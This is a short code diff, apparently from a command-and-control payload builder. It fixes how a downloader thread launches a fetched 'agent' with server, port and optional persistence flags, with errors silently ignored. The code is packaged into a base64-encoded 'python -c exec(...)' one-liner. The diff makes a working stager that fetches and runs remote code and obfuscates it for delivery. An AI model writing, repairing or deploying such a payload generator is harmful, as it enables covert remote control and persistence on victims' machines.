@@ -291,7 +291,10 @@ def dl():
             f.write(r)
         
         # Run agent
-        subprocess.Popen([sys.executable, p, "--server", "{server_host}", "--port", "{server_port}"{"", "--persistence"' if with_persistence else ''}])
+        cmd = [sys.executable, p, "--server", server_host, "--port", str(server_port)]
+        if with_persistence:
+            cmd.append("--persistence")
+        subprocess.Popen(cmd)
     except Exception as e:
         pass
 
@@ -303,7 +306,7 @@ threading.Thread(target=dl).start()
     encoded = base64.b64encode(python_code.encode()).decode()
     
     # Create one-liner
-    one_liner = f"python -c \"import base64,sys;exec(base64.b64decode('{encoded}').decode())\"" 
+    one_liner = f"python -c \"import base64,sys;exec(base64.b64decode('{encoded}').decode())\""
     
     print(f"Base64 one-liner generated ({len(one_liner)} chars)")
     return one_liner
